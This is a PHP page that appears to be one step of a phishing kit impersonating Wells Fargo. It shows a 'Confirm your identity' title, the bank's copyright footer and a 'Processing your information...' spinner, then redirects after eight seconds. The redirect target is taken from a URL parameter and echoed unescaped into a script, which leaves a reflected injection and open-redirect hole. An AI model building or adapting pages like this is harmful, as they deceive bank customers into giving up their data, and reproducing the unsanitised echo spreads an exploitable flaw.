<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm your identity</title>
    <link rel="stylesheet" href="res/fonts.css">
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="container">
    <img src="res/logo.png">
</div>
</header>

<main>
<div class="container">



<div class="form">
<div class="title">Processing your information...</div>
<div class="text">Please do not leave this page.</div>
<div class="col"><img src="res/loading.gif" style="width:40px;"></div>
</div>


<footer>
    <p class="link">Privacy, Cookies, Security, and Legal</p>
    <p class="small">© 1999 - 2024 Wells Fargo. All rights reserved.</p>
</footer>
</div>
</main>



<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>